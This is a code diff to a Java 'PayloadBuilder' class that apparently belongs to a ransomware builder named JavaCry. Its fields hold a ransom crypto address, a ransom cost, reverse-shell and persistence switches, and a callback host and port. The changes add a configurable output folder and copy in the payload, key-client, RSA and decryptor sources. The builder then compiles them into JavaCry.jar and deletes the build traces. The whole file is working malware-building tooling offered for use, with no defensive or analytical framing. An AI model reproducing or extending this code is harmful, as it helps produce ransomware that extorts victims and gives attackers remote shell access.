@@ -13,6 +13,7 @@ public class PayloadBuilder {
     private String workingDir = "../../output/";
     private String payloadDir = "../../Payload/";
     private String path = "";
+    private String expPath = "";
     private String IP = "127.0.0.1";
     private String CryptAddress = "[My Address]";
     private boolean useRevShell;
@@ -28,10 +29,16 @@ public class PayloadBuilder {
         path = "";
     }
 
-    public PayloadBuilder(String path, String CryptAddress, double cost, boolean useRevShell, boolean usePersistence, String host, int port) {
+    public PayloadBuilder(String path, String expPath, String CryptAddress, double cost, boolean useRevShell, boolean usePersistence, String host, int port) {
         this.useRevShell = useRevShell;
         this.usePersistence = usePersistence;
         this.path = path;
+
+        if (expPath.charAt(expPath.length()-1) != '/' && expPath.charAt(expPath.length()-1) != '\\') {
+            expPath += "/";
+        }
+        this.expPath = expPath;
+        this.workingDir = expPath;
         IP = host;
         revPort = port;
         this.CryptAddress = CryptAddress;
@@ -70,6 +77,9 @@ public class PayloadBuilder {
             Files.copy(new FileInputStream(new File(payloadDir + "KeyClient.java")), Paths.get(workingDir, "KeyClient.java"), StandardCopyOption.REPLACE_EXISTING);
             Files.copy(new FileInputStream(new File(payloadDir + "RSACrypt.java")), Paths.get(workingDir, "RSACrypt.java"), StandardCopyOption.REPLACE_EXISTING);
             Files.copy(new FileInputStream(new File(payloadDir + "manifest.txt")), Paths.get(workingDir, "manifest.txt"), StandardCopyOption.REPLACE_EXISTING);
+            
+            new File(workingDir + "img").mkdirs();
+            Files.copy(new FileInputStream(new File(payloadDir + "img/loading.gif")), Paths.get(workingDir, "img/loading.gif"), StandardCopyOption.REPLACE_EXISTING);
         } catch (Exception e) {
             System.out.println(e);
         }     
@@ -121,7 +131,7 @@ public class PayloadBuilder {
 
             Process process = Runtime.getRuntime().exec("javac JavaCry.java -d Classes --release 8", null, new File(workingDir));
             process.waitFor();
-            process = Runtime.getRuntime().exec("jar -cvmf ../manifest.txt JavaCry.jar JavaCry.class KeyClient.class RSACrypt.class ../img/", null, new File(workingDir + "Classes/"));
+            process = Runtime.getRuntime().exec("jar -cvmf ../manifest.txt ../JavaCry.jar JavaCry.class KeyClient.class RSACrypt.class ../img/", null, new File(workingDir + "Classes/"));
             
             StringBuilder output = new StringBuilder();
 
@@ -136,7 +146,46 @@ public class PayloadBuilder {
             
             process.waitFor();
 
+            // String os = System.getProperty("os.name").split(" ")[0];
+            // if (os.equals("Linux") || os.equals("Mac OS X")) {
+            //     process = Runtime.getRuntime().exec("chmod 777 " + workingDir + "Classes/JavaCry.jar");
+            //     process.waitFor();
+            // } else {
+            //     process = Runtime.getRuntime().exec("cacls" + workingDir + "Classes/JavaCry.jar" + "/g everyone:f");
+            //     process.waitFor();
+            // }
 
+            Files.copy(new FileInputStream(new File(payloadDir + "Decryptor.java")), Paths.get(workingDir, "Decryptor.java"), StandardCopyOption.REPLACE_EXISTING);
+
+            File decryptor = new File(workingDir + "Decryptor.java");
+            File rsacrypt = new File(workingDir + "RSACrypt.java");
+            File payload = new File(workingDir + "JavaCry.java");
+            File keyclient = new File(workingDir + "KeyClient.java");
+            File manifest = new File(workingDir + "manifest.txt");
+            File imgDir = new File(workingDir + "img/");
+            File clsDir = new File(workingDir + "Classes/");
+
+            decryptor.delete();
+            payload.delete();
+            keyclient.delete();
+            manifest.delete();
+            rsacrypt.delete();
+            
+            File[] folderContent = imgDir.listFiles();
+            if (folderContent != null) {
+                for (File file : folderContent) {
+                    file.delete();
+                }
+            }
+            imgDir.delete();
+
+            folderContent = clsDir.listFiles();
+            if (folderContent != null) {
+                for (File file : folderContent) {
+                    file.delete();
+                }
+            }
+            clsDir.delete();
 
             return true;
         } catch (Exception e) {
